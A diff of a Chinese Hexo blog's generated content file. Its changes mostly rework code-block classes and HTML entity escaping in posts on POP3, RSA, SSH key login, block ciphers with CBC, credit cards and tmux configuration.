+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">From: alice@crepes.fr</span><br><span class="line">To: bob@hamburger.edu</span><br><span class="line">Subject: Searching for the meaning of life.</span><br></pre></td></tr></table></figure>
 
 <h2 id="POP3"><a href="#POP3" class="headerlink" title="POP3"></a>POP3</h2><p><strong>POP3</strong>（Post Office Protocol——Version 3，<strong>第三版的邮局协议</strong>）是一个极为简单的邮件访问协议。</p>
 <p>当用户代理（客户）打开了一个到邮件服务器（服务器）端口 <strong>110</strong> 上的 TCP 连接后，POP3 就开始工作了。随着建立 TCP 连接，POP3 按照 3 个阶段进行工作：</p>
@@ -3320,11 +3322,11 @@
 <li><code>-ERR</code>：被服务器用来指示前面的命令出现了某些差错</li>
 </ul>
 <p>特许阶段有两个主要的命令：<code>user &lt;user name&gt;</code> 和 <code>pass &lt;password&gt;</code>。你可以使用 Telnet 进行测试，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet outlook.office365.com 110</span><br><span class="line">+OK The Microsoft Exchange POP3 service is ready.</span><br><span class="line">user bob</span><br><span class="line">+OK</span><br><span class="line">pass hungry</span><br><span class="line">+OK user successfully logged on</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">telnet outlook.office365.com 110</span><br><span class="line">+OK The Microsoft Exchange POP3 service is ready.</span><br><span class="line">user bob</span><br><span class="line">+OK</span><br><span class="line">pass hungry</span><br><span class="line">+OK user successfully logged on</span><br></pre></td></tr></table></figure>
 
 <p>在特许阶段以后，用户代理仅使用 4 个命令 <code>list</code>、<code>retr</code>、<code>dele</code> 和 <code>quit</code>。</p>
 <p>使用 POP3 的用户代理通常被用户配置为“<strong>下载并删除</strong>”或者“<strong>下载并保留</strong>”方式。POP3 用户代理发出的命令序列取决于用户代理程序被配置为这两种工作方式的哪一种。使用下载并删除方式，用户代理发出 <code>list</code> —— <code>retr</code> —— <code>dele</code> 命令，如下（C 代表客户，S 代表服务器）：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C: list</span><br><span class="line">S: 1 498</span><br><span class="line">S: 2 912</span><br><span class="line">S: .</span><br><span class="line">C: retr 1</span><br><span class="line">S: (blah blah ...</span><br><span class="line">S: .................</span><br><span class="line">S: ..........blah)</span><br><span class="line">S: .</span><br><span class="line">C: dele 1</span><br><span class="line">C: retr 2</span><br><span class="line">S: (blah blah ...</span><br><span class="line">S: .................</span><br><span class="line">S: ..........blah)</span><br><span class="line">S: .</span><br><span class="line">C: dele 2</span><br><span class="line">C: quit</span><br><span class="line">S: +OK POP3 server signing off</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">C: list</span><br><span class="line">S: 1 498</span><br><span class="line">S: 2 912</span><br><span class="line">S: .</span><br><span class="line">C: retr 1</span><br><span class="line">S: (blah blah ...</span><br><span class="line">S: .................</span><br><span class="line">S: ..........blah)</span><br><span class="line">S: .</span><br><span class="line">C: dele 1</span><br><span class="line">C: retr 2</span><br><span class="line">S: (blah blah ...</span><br><span class="line">S: .................</span><br><span class="line">S: ..........blah)</span><br><span class="line">S: .</span><br><span class="line">C: dele 2</span><br><span class="line">C: quit</span><br><span class="line">S: +OK POP3 server signing off</span><br></pre></td></tr></table></figure>
 
 <p>使用下载并保留方式，用户代理下载某邮件后，该邮件仍保留在邮件服务器上。</p>
 <h2 id="IMAP"><a href="#IMAP" class="headerlink" title="IMAP"></a>IMAP</h2><p><strong>IMAP</strong>（Internet Mail Access Protocol，<strong>因特网邮件访问协议</strong>）是一个相比 POP3 更强大的邮件访问协议。</p>
@@ -3514,9 +3516,9 @@
 <span id="more"></span>
 <h2 id="公钥与私钥"><a href="#公钥与私钥" class="headerlink" title="公钥与私钥"></a>公钥与私钥</h2><p>RSA 加密算法通过如下步骤生成公钥和私钥：</p>
 <ol>
-<li>随机选择 2 个不相等的质数 $p$ 和 $q$，计算 $p$ 和 $q$ 的乘积 $n$<br>取 $p=61$，$q=53$，则 $n=3233$</li>
-<li>计算 $n$ 的欧拉函数 $\phi(n)$<br>$\phi(3233)=60×52=3120$</li>
-<li>随机选择一个整数 $e$，条件是 $1&lt;e&lt;\phi(n)$，且 $e$ 与 $\phi(n)$ 互质，并计算 $e$ 对于 $\phi(n)$ 的模反元素 $d$<br>取 $e=17$，$d=2753$</li>
+<li>随机选择 2 个不相等的质数 $p$ 和 $q$，计算 $p$ 和 $q$ 的乘积 $n$<br>取 $p&#x3D;61$，$q&#x3D;53$，则 $n&#x3D;3233$</li>
+<li>计算 $n$ 的欧拉函数 $\phi(n)$<br>$\phi(3233)&#x3D;60×52&#x3D;3120$</li>
+<li>随机选择一个整数 $e$，条件是 $1&lt;e&lt;\phi(n)$，且 $e$ 与 $\phi(n)$ 互质，并计算 $e$ 对于 $\phi(n)$ 的模反元素 $d$<br>取 $e&#x3D;17$，$d&#x3D;2753$</li>
 <li>将 $n$ 和 $e$ 封装成公钥，$n$ 和 $d$ 封装成私钥<br>公钥为 $(n, e)$，私钥为 $(n, d)$</li>
 </ol>
 <h2 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h2>]]></content>
@@ -3666,7 +3668,7 @@
     <title>《黑客军团》中使用的软件</title>
     <url>/2018/09/18/software-used-in-mr-robot/</url>
     <content><![CDATA[<p>本文翻译自 <a href="https://alternativeto.net/list/66/software-used-in-mr-robot">https://alternativeto.net/list/66/software-used-in-mr-robot</a> ，正文如下：</p>
-<p><img src="https://p0.ssl.qhimg.com/t01708531e12a86f171.jpg" alt="首页图片"><br>本文盘点了获得艾美奖和金球奖剧情/惊悚系列电视剧——《黑客军团》中黑客使用的软件。<br><strong>下面的列表包含到了第二季第11集！</strong></p>
+<p><img src="https://p0.ssl.qhimg.com/t01708531e12a86f171.jpg" alt="首页图片"><br>本文盘点了获得艾美奖和金球奖剧情&#x2F;惊悚系列电视剧——《黑客军团》中黑客使用的软件。<br><strong>下面的列表包含到了第二季第11集！</strong></p>
 <span id="more"></span>
 
 <h2 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a><a href="https://www.kali.org/">Kali Linux</a></h2><p>Kali Linux是针对安全研究人员进行渗透测试的Linux发行版，但同时也被黑客使用，因为它集成了很多黑客工具。由于它是黑客的首选操作系统，所以它在《黑客军团》中经常有过出现。</p>
@@ -3712,7 +3714,7 @@
     <url>/2018/05/09/source-sh/</url>
     <content><![CDATA[<h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><p><code>source a.sh</code> 在当前 Shell 中执行 <code>a.sh</code>，<code>a.sh</code> 不需要有执行权限。<code>source</code> 也可以简写为 <code>.</code>，比如 <code>. a.sh</code>。</p>
 <h2 id="sh"><a href="#sh" class="headerlink" title="sh"></a>sh</h2><p><code>sh a.sh</code> 打开一个子 Shell 去执行 <code>a.sh</code>，<code>a.sh</code> 不需要有执行权限。在子 Shell 里执行的 <code>a.sh</code> 里设置的变量，不会影响到父 Shell。类似的，<code>bash</code> 与 <code>sh</code> 同理。</p>
-<h2 id=""><a href="#" class="headerlink" title="./"></a>./</h2><p><code>./a.sh</code> 打开一个子 Shell 去执行 <code>a.sh</code>，<code>a.sh</code> 需要有执行权限。注意，这里 <code>./</code> 与 <code>a.sh</code> 之间没有空格，换个角度看，其实没有使用任何命令，只是指定了当前文件夹下的这个文件而已。这就相当于双击这个文件去运行一样，那这个文件肯定要具有可执行权限。至于为什么要加 <code>./</code>，我猜想是为了预防与环境变量中相同的名称引起冲突。</p>
+<h2 id="x2F"><a href="#x2F" class="headerlink" title=".&#x2F;"></a>.&#x2F;</h2><p><code>./a.sh</code> 打开一个子 Shell 去执行 <code>a.sh</code>，<code>a.sh</code> 需要有执行权限。注意，这里 <code>./</code> 与 <code>a.sh</code> 之间没有空格，换个角度看，其实没有使用任何命令，只是指定了当前文件夹下的这个文件而已。这就相当于双击这个文件去运行一样，那这个文件肯定要具有可执行权限。至于为什么要加 <code>./</code>，我猜想是为了预防与环境变量中相同的名称引起冲突。</p>
 <p>前面采用了相对路径的方法，当然也可以采用绝对路径，比如 <code>/root/a.sh</code> 这样，同样可以执行。</p>
 <p>另外，<code>./</code> 运行的文件里通常有 <strong>Shebang</strong> 一行，也就是以 <code>#!</code> 开头的第一行，用以指明执行这个脚本文件的解释程序。如果没有 Shebang 一行，那么以 <code>./a.sh</code> 运行脚本时，会自动使用环境变量中的 <code>$SHELL</code> 变量所指定的解释器来运行。</p>
 <p>最后，在以 <code>sh a.sh</code> 或 <code>bash a.sh</code> 这样的命令运行脚本时，即使文件中指明了 Shebang，也会自动忽略，因为在命令中已经明确指定了所采用的解释器。</p>
@@ -3734,13 +3736,13 @@
 <h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>按照最佳实践，项目文档一般是在项目的 <code>docs</code> 目录中，所以不妨先创建一个 <code>docs</code> 目录并进入，之后的一切有关 sphinx 的命令都在此目录中运行。</p>
 <p>安装完 Sphinx 并进入 <code>docs</code> 目录后，输入 <code>sphinx-quickstart</code> 即可创建一个文档项目。该引导程序会询问你一些问题，并根据你给出的回答对生成的文档项目进行相关配置，当然，这些配置都可以在生成后的 <code>conf.py</code> 文件中进行重新设置。以下是它可能会问到的一些问题：</p>
 <ul>
-<li>分隔“source”和“build”目录（y/n）[n]：默认不分隔即可</li>
+<li>分隔“source”和“build”目录（y&#x2F;n）[n]：默认不分隔即可</li>
 <li>项目名称：项目名称将显示在左侧导航栏顶部</li>
 <li>作者姓名：作者姓名将显示在页面底部</li>
 <li>项目版本：可不填</li>
 <li>项目语言[en]：默认为英文，要切换为中文请输入 <code>zh_CN</code></li>
 </ul>
-<p>执行完成后，会在当前目录下生成如下文件/文件夹：</p>
+<p>执行完成后，会在当前目录下生成如下文件&#x2F;文件夹：</p>
 <ul>
 <li><code>_duild/</code>：存放构建之后的文件</li>
 <li><code>_static/</code>：存放静态文件</li>
@@ -3775,7 +3777,7 @@
 <span id="more"></span>
 
 <p>因为不像 HTTPS 协议，SSH 协议的公钥是没有证书中心（CA）公证的，所以为了防止中间人攻击，当用户第一次登录远程主机时，系统会提示如下信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The authenticity of host &#x27;host (12.18.429.21)&#x27; can&#x27;t be established.</span><br><span class="line">RSA key fingerprint is 98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)?</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">The authenticity of host &#x27;host (12.18.429.21)&#x27; can&#x27;t be established.</span><br><span class="line">RSA key fingerprint is 98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)?</span><br></pre></td></tr></table></figure>
 
 <p>即系统无法确认远程主机的真实性（远程主机有可能是中间人），只知道远程主机的公钥指纹，询问用户是否继续连接。公钥指纹就是对公钥进行哈希计算得到的，为了方便用户的比较。用户并没有什么好的办法得知自己想要连接的真实远程主机的公钥指纹，一个可行的办法是远程主机在其官方网站上贴出自己的公钥指纹，方便用户和系统提示的指纹进行比较。</p>
 <p>假定当用户进行风险衡量后决定继续连接，接下来的过程就如上述提到的一样。远程主机的公钥会被保存在 <code>$HOME/.ssh/known_hosts</code> 文件中，当用户下次再连接时，系统就会认出它的公钥已经保存在本地了，从而跳过警告部分，直接提示输入密码。</p>
@@ -3787,11 +3789,11 @@
 
 <p>实际上，<code>ssh-copy-id</code> 还会对创建的文件及文件夹进行相关的权限设置，这里不过多介绍。</p>
 <p>最后还要对远程主机的 SSH 服务端配置文件，即 <code>/etc/ssh/sshd_config</code> 文件进行相关配置，并重启 SSH 服务即可生效。具体而言，涉及到的配置项如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile .ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile .ssh/authorized_keys</span><br></pre></td></tr></table></figure>
 
 <p>紧接着使用 <code>service sshd restart</code> 重启 SSH 服务。</p>
 <h2 id="快速登录"><a href="#快速登录" class="headerlink" title="快速登录"></a>快速登录</h2><p><code>$HOME/.ssh</code> 目录下的 <code>config</code> 文件可配置快速登录选项，若没有，可以新建一个，具体而言，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">host aliyun</span><br><span class="line">    user howie</span><br><span class="line">    hostname 192.168.0.41</span><br><span class="line">    port 22</span><br><span class="line">    identityfile ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">host aliyun</span><br><span class="line">    user howie</span><br><span class="line">    hostname 192.168.0.41</span><br><span class="line">    port 22</span><br><span class="line">    identityfile ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
 
 <p>这代表当输入 <code>ssh aliyun</code> 时，其默认执行 <code>ssh howie@192.168.0.41 -p 22 -i ~/.ssh/id_rsa</code>。当有多个别名需要设置时，其中间要空上一行。</p>
 <h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><p>使用密钥连接后仍然需要输入登录密码：<br>这种情况一般是由于密钥登录失败所导致的，请检查 <code>$HOME/.ssh</code> 目录是否为 700 权限，<code>$HOME/.ssh/authorized_keys</code> 文件是否为 600 权限，除此之外的其他权限均不能成功。</p>
@@ -3835,11 +3837,11 @@
 <span id="more"></span>
 
 <h2 id="块密码"><a href="#块密码" class="headerlink" title="块密码"></a>块密码</h2><p>在块密码中，要加密的报文被处理为 $k$ 比特的块。为了加密一个块，该密码采用了一对一映射，将 $k$ 比特块的明文映射为 $k$ 比特块的密文。</p>
-<p>假设 $k=3$，因此块密码将 3 比特输入（明文）映射为 3 比特输出（密文）。下表给出了一种可能的映射：</p>
+<p>假设 $k&#x3D;3$，因此块密码将 3 比特输入（明文）映射为 3 比特输出（密文）。下表给出了一种可能的映射：</p>
 <table>
 <thead>
 <tr>
-<th>输入/输出</th>
+<th>输入&#x2F;输出</th>
 <th>比特块</th>
 <th>比特块</th>
 <th>比特块</th>
@@ -3874,27 +3876,27 @@
 </tr>
 </tbody></table>
 <p>可以验证，报文 <code>010110001111</code> 被加密成了 <code>101000111001</code>。</p>
-<p>注意到上述映射只是许多可能映射中的一种，观察到一个映射只不过是所有可能输入的排列，共有 $2^3$（=8）种可能的输入（排列在“输入”栏中），这 8 种输入能够排列为 $8!=40320$ 种不同方式，因此共有 40320 种可能的映射。我们能够将这些映射的每种视为一个密钥，即如果 A 和 B 都知道该映射（密钥），它们能够加密和解密在它们之间发送的报文。</p>
-<p>对这种密码的蛮力攻击即通过使用所有映射来尝试解密密文，为了挫败蛮力攻击，块密码通常使用大得多的块，由 64 比特甚至更多比特组成。注意到对于通常的 $k$ 比特块密码，可能映射数量是 $2^k!$，对于即使不大的 $k$ 值（如 $k=64$），这也是一个天文数字。</p>
+<p>注意到上述映射只是许多可能映射中的一种，观察到一个映射只不过是所有可能输入的排列，共有 $2^3$（&#x3D;8）种可能的输入（排列在“输入”栏中），这 8 种输入能够排列为 $8!&#x3D;40320$ 种不同方式，因此共有 40320 种可能的映射。我们能够将这些映射的每种视为一个密钥，即如果 A 和 B 都知道该映射（密钥），它们能够加密和解密在它们之间发送的报文。</p>
+<p>对这种密码的蛮力攻击即通过使用所有映射来尝试解密密文，为了挫败蛮力攻击，块密码通常使用大得多的块，由 64 比特甚至更多比特组成。注意到对于通常的 $k$ 比特块密码，可能映射数量是 $2^k!$，对于即使不大的 $k$ 值（如 $k&#x3D;64$），这也是一个天文数字。</p>
 <p>像上面这种在所有输入和输出之间提供了预先决定的映射的方法称为<strong>全表块密码</strong>，尽管全表块密码对于不大的 $k$ 值能够产生健壮的对称密钥加密方案，但这要求加密双方各维护一张具有 $2^k$ 个输入值的表，这是一个难以实现的任务。此外，如果加密双方要改变密钥，它们将不得不各自重新生成该表。</p>
-<p>取而代之的是，块密码通常使用函数模拟随机排列表。下图显示了当 $k=64$ 时，这种函数的一个例子。</p>
+<p>取而代之的是，块密码通常使用函数模拟随机排列表。下图显示了当 $k&#x3D;64$ 时，这种函数的一个例子。</p>
 <p><img src="/images/block-cipher-example.jpg" alt="block cipher example"></p>
 <p>该函数首先将 64 比特块划分为 8 个块，每个块由 8 比特组成。每个 8 比特块由一个“8 比特到 8 比特”表处理，这是个可管理的长度。例如，第一个块由标志为 $T_1$ 的表来处理。接下来，这 8 个输出块被重新装配成一个 64 比特的块。该输出被回馈到 64 比特的输入，开始了第二次循环。经 n 次这样的循环后，该函数提供了一个 64 比特的密文块。这种循环的目的是使得每个输入比特影响最后输出比特的大部分（即使不是全部）。（如果仅使用一次循环，一个给定的输入比特将仅影响 64 输出比特中的 8 比特。）这种块密码算法的密钥将是 8 张排列表（假定置乱函数是公共已知的）。</p>
 <p>目前有一些流行的块密码，包括 DES、3DES 和 AES 等。这些标准都使用了函数（而不是预先决定的表），连同上图中的线（虽然对每种密码来说更为复杂和具体）。这些算法也都使用了比特串作为密钥。一个算法的密钥决定了特定“小型表”映射和该算法内部的排列。</p>
 <h3 id="密码块链接"><a href="#密码块链接" class="headerlink" title="密码块链接"></a>密码块链接</h3><p>对于相同的块，块密码当然将产生相同的密文，这是不安全的，为了解决这个问题，可以在密文中混合某些随机性，使得相同的明文块产生不同的密文块。</p>
 <p>在介绍其思想之前，先明确一些术语：令 $m(i)$ 表示第 $i$ 个明文块，$c(i)$ 表示第 $i$ 个密文块，并且 $a\oplus b$ 表示两个比特串 $a$ 和 $b$ 的异或（XOR），另外，将具有密钥 $S$ 的块密码加密算法表示为 $K_S$。</p>
 <p>其基本思想如下：</p>
-<p>发送方为第 $i$ 块生成一个随机的 $k$ 比特数 $r(i)$，并且计算 $c(i)=K_S(m(i)\oplus r(i))$。注意到每块选择一个新的 $k$ 比特随机数。则发送方发送 $c(1)$、$r(1)$、$c(2)$、$r(2)$、$c(3)$ 和 $r(3)$ 等等。因为接收方接收到 $c(i)$ 和 $r(i)$，它能够通过计算 $m(i)=K_S(c(i)\oplus r(i))$ 而恢复每个明文块。</p>
+<p>发送方为第 $i$ 块生成一个随机的 $k$ 比特数 $r(i)$，并且计算 $c(i)&#x3D;K_S(m(i)\oplus r(i))$。注意到每块选择一个新的 $k$ 比特随机数。则发送方发送 $c(1)$、$r(1)$、$c(2)$、$r(2)$、$c(3)$ 和 $r(3)$ 等等。因为接收方接收到 $c(i)$ 和 $r(i)$，它能够通过计算 $m(i)&#x3D;K_S(c(i)\oplus r(i))$ 而恢复每个明文块。</p>
 <p>尽管 $r(i)$ 是以明文发送的，但嗅探者无法获得明文 $m(i)$，因为它不知道密钥 $K_S$。如果两个明文块 $m(i)$ 和 $m(j)$ 是相同的，对应的密文块 $c(i)$ 和 $c(j)$ 将是不同的（只要随机数 $r(i)$ 和 $r(j)$ 不同，这种情况出现的概率将很高）。</p>
-<p>举例来说，参照上表的 3 比特块密码，假设明文是 <code>010010010</code>，若直接加密，没有包括随机性，则密文为 <code>101101101</code>；若使用上述技术加密，假设生成了随机块 $r(1)=001$，$r(2)=111$ 和 $r(3)=100$，则生成的密文为 $c(1)=100$，$c(2)=010$ 和 $c(3)=000$。</p>
+<p>举例来说，参照上表的 3 比特块密码，假设明文是 <code>010010010</code>，若直接加密，没有包括随机性，则密文为 <code>101101101</code>；若使用上述技术加密，假设生成了随机块 $r(1)&#x3D;001$，$r(2)&#x3D;111$ 和 $r(3)&#x3D;100$，则生成的密文为 $c(1)&#x3D;100$，$c(2)&#x3D;010$ 和 $c(3)&#x3D;000$。</p>
 <p>引入随机性解决了一个问题而产生了另一个问题，即发送方必须传输以前两倍的比特。实际上，对每个加密比特，它现在必须再发送一个随机比特，使需要的带宽加倍。为了有效利用该技术，块密码通常使用了一种称为<strong>密码块链接</strong>（Cipher Block Chaining，<strong>CBC</strong>）的技术。其基本思想是 <em>仅随第一个报文发送一个随机值，然后让发送方和接收方使用计算的编码块代替后继的随机数</em>。具体而言，CBC 运行过程如下：</p>
 <ol>
 <li>在加密报文（或数据流）之前，发送方生成一个随机的 $k$ 比特串，称为<strong>初始向量</strong>（Initialization Vector，<strong>IV</strong>）。将该初始向量表示为 $c(0)$。发送方以 <em>明文方式</em> 将 IV 发送给接收方。</li>
-<li>对第一个块，发送方计算 $m(1)\oplus c(0)$，即计算第一块明文与 IV 的异或。然后通过块密码算法运行得到的结果以得到对应的密文块，即 $c(1)=K_S(m(1)\oplus c(0))$。发送方向接收方发送加密块 $c(1)$。</li>
-<li>对于第 $i$ 个块，发送方根据 $c(i)=K_S(m(i)\oplus c(i-1))$ 生成第 $i$ 个密文块。</li>
+<li>对第一个块，发送方计算 $m(1)\oplus c(0)$，即计算第一块明文与 IV 的异或。然后通过块密码算法运行得到的结果以得到对应的密文块，即 $c(1)&#x3D;K_S(m(1)\oplus c(0))$。发送方向接收方发送加密块 $c(1)$。</li>
+<li>对于第 $i$ 个块，发送方根据 $c(i)&#x3D;K_S(m(i)\oplus c(i-1))$ 生成第 $i$ 个密文块。</li>
 </ol>
-<p>当接收方接收到 $c(i)$ 时，它用 $K_S$ 解密之以获得 $s(i)=m(i)\oplus c(i-1)$；因为接收方已经知道 $c(i-1)$，则从 $m(i)=s(i)\oplus c(i-1)$ 获得明文块。</p>
-<p>举例来说，参照上表的 3 比特块密码，假设明文是 <code>010010010</code>，$IV=c(0)=001$，则 $c(1)=K_S(m(1)\oplus c(0))=100$，$c(2)=K_S(m(2)\oplus c(1))=K_S(010\oplus 100)=000$，$c(3)=K_S(m(3)\oplus c(2))=K_S(010\oplus 000)=101$。</p>
+<p>当接收方接收到 $c(i)$ 时，它用 $K_S$ 解密之以获得 $s(i)&#x3D;m(i)\oplus c(i-1)$；因为接收方已经知道 $c(i-1)$，则从 $m(i)&#x3D;s(i)\oplus c(i-1)$ 获得明文块。</p>
+<p>举例来说，参照上表的 3 比特块密码，假设明文是 <code>010010010</code>，$IV&#x3D;c(0)&#x3D;001$，则 $c(1)&#x3D;K_S(m(1)\oplus c(0))&#x3D;100$，$c(2)&#x3D;K_S(m(2)\oplus c(1))&#x3D;K_S(010\oplus 100)&#x3D;000$，$c(3)&#x3D;K_S(m(3)\oplus c(2))&#x3D;K_S(010\oplus 000)&#x3D;101$。</p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
 <li><a href="https://book.douban.com/subject/30280001/">James F. Kurose,Keith W. Ross.计算机网络：自顶向下方法[M].北京:机械工业出版社,2018:390-392.</a></li>
 </ol>
@@ -3924,7 +3926,7 @@
     <title>说说信用卡</title>
     <url>/2019/01/08/talk-about-credit-card/</url>
     <content><![CDATA[<h2 id="年费"><a href="#年费" class="headerlink" title="年费"></a>年费</h2><p>所谓<strong>年费</strong>，即每年的管理费，几乎所有信用卡都有年费，年费一般可以通过两种方法免去，即<strong>刷够指定额度</strong>或<strong>刷够指定笔数</strong>，具体采用哪种方法依据特定的信用卡而定。有的信用卡是“<strong>终身免年费</strong>”的，这里的终身一般指信用卡的<strong>有效期</strong>内。</p>
-<h2 id="有效期"><a href="#有效期" class="headerlink" title="有效期"></a>有效期</h2><p>为了保护信用卡的安全，信用卡是有有效期的，一般印在信用卡上的<strong>VALID THRU</strong>字段，比如05/26代表2026年5月过期，过期之后要重新去银行办理。</p>
+<h2 id="有效期"><a href="#有效期" class="headerlink" title="有效期"></a>有效期</h2><p>为了保护信用卡的安全，信用卡是有有效期的，一般印在信用卡上的<strong>VALID THRU</strong>字段，比如05&#x2F;26代表2026年5月过期，过期之后要重新去银行办理。</p>
 <span id="more"></span>
 <h2 id="等级"><a href="#等级" class="headerlink" title="等级"></a>等级</h2><p>信用卡的等级从低到高一般分为<strong>普卡</strong>、<strong>金卡</strong>（Gold）、<strong>白金卡</strong>（Platinum）等，等级越高，优惠越多，额度越大，但相应的，年费也会越高。</p>
 <h2 id="溢缴款"><a href="#溢缴款" class="headerlink" title="溢缴款"></a>溢缴款</h2><p>信用卡不同于借记卡（或储蓄卡），信用卡的主要目的是用于消费，而不是存款，因此，存在信用卡里面的钱是没有利息的，这笔钱被叫做<strong>溢缴款</strong>，溢缴款取现是要收取手续费的。但在消费时，会优先扣除溢缴款，随后扣除额度。</p>
@@ -4121,7 +4123,7 @@
     <content><![CDATA[<p><a href="https://github.com/tmux/tmux">tmux</a> 是一款优秀的<strong>终端复用</strong>工具，在 Ubuntu 下，使用 <code>sudo apt install tmux</code> 即可安装，输入 <code>tmux</code> 即可开始使用。与 tmux 相似的软件还有 <a href="https://www.gnu.org/software/screen/">Screen</a> 等。</p>
 <h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><h3 id="Session（会话）"><a href="#Session（会话）" class="headerlink" title="Session（会话）"></a>Session（会话）</h3><p>当输入<code>tmux</code>后，实际上创建了一个Session，你可以在这个Session里创建多个Window，在Window里创建多个Pane。</p>
 <h3 id="Window（窗口）"><a href="#Window（窗口）" class="headerlink" title="Window（窗口）"></a>Window（窗口）</h3><p>Window是显示给你的一整片窗口，你可以创建多个Window，在一个Window里面你又可以创建多个Pane，以此来执行多个任务。</p>
-<h3 id="Pane（窗格-面板）"><a href="#Pane（窗格-面板）" class="headerlink" title="Pane（窗格/面板）"></a>Pane（窗格/面板）</h3><p>Pane是tmux中的最小单位，每个Pane相当于一个终端。</p>
+<h3 id="Pane（窗格-x2F-面板）"><a href="#Pane（窗格-x2F-面板）" class="headerlink" title="Pane（窗格&#x2F;面板）"></a>Pane（窗格&#x2F;面板）</h3><p>Pane是tmux中的最小单位，每个Pane相当于一个终端。</p>
 <span id="more"></span>
 <p>一个常见的tmux运行效果可能如下图所示：<br><img src="/images/tmux.jpg" alt="tmux"><br>其中，Window被分成了3个Pane，每个Pane之间通过<strong>Pane Border</strong>（面板分隔符）加以区分。Window底部则是<strong>Status Bar</strong>（状态栏），状态栏从左往右依次被分为<strong>左面板</strong>、<strong>窗口列表</strong>、<strong>右面板</strong>。按照上图所示，其中左面板显示了Session的名称，窗口列表则显示了当前Window的索引值和名称，最后右面板依次显示了计算机名称、时间、日期。</p>
 <h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><code>tmux</code>命令拥有众多参数，如下所示：</p>
@@ -4161,13 +4163,13 @@
 </ul>
 <p>值得注意的是，当创建Session后，默认会创建一个Window，当创建Window后，默认会创建一个Pane。</p>
 <h2 id="tmux-conf"><a href="#tmux-conf" class="headerlink" title=".tmux.conf"></a>.tmux.conf</h2><p><code>$HOME/.tmux.conf</code>文件是tmux的配置文件，tmux在启动时会按照此文件中的命令进行相关配置，个人常用的配置如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 设定快捷键前缀</span><br><span class="line">unbind-key C-b</span><br><span class="line">set-option -g prefix C-x</span><br><span class="line">bind-key C-x send-prefix</span><br><span class="line">set-option -g escape-time 0</span><br><span class="line"></span><br><span class="line"># 开启鼠标模式</span><br><span class="line">set -g mouse on</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># 设定快捷键前缀</span><br><span class="line">unbind-key C-b</span><br><span class="line">set-option -g prefix C-x</span><br><span class="line">bind-key C-x send-prefix</span><br><span class="line">set-option -g escape-time 0</span><br><span class="line"></span><br><span class="line"># 开启鼠标模式</span><br><span class="line">set -g mouse on</span><br></pre></td></tr></table></figure>
 
 <h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p>tmux支持许多插件，在安装插件之前最好先安装插件管理器<a href="https://github.com/tmux-plugins/tpm">TPM</a>，使用如下命令即可下载TPM：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm</span><br></pre></td></tr></table></figure>
 
 <p>下载完之后，只需在<code>.tmux.conf</code>文件底部添加相关配置，然后进入tmux输入<code>prefix + I</code>，即可自动下载并安装相应的插件，升级插件可使用<code>prefix + U</code>。个人常用的插件如下：<br>相应的，<code>.tmux.conf</code>文件中插件相关的配置项如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 插件</span><br><span class="line"># List of plugins</span><br><span class="line">set -g @plugin &#x27;tmux-plugins/tpm&#x27;</span><br><span class="line">set -g @plugin &#x27;tmux-plugins/tmux-sensible&#x27;</span><br><span class="line"></span><br><span class="line"># Other examples:</span><br><span class="line"># set -g @plugin &#x27;github_username/plugin_name&#x27;</span><br><span class="line"># set -g @plugin &#x27;git@github.com/user/plugin&#x27;</span><br><span class="line"># set -g @plugin &#x27;git@bitbucket.com/user/plugin&#x27;</span><br><span class="line"></span><br><span class="line"># Initialize TMUX plugin manager (keep this line at the very bottom of tmux.conf)</span><br><span class="line">run -b &#x27;~/.tmux/plugins/tpm/tpm&#x27;</span><br></pre></td></tr></table></figure>
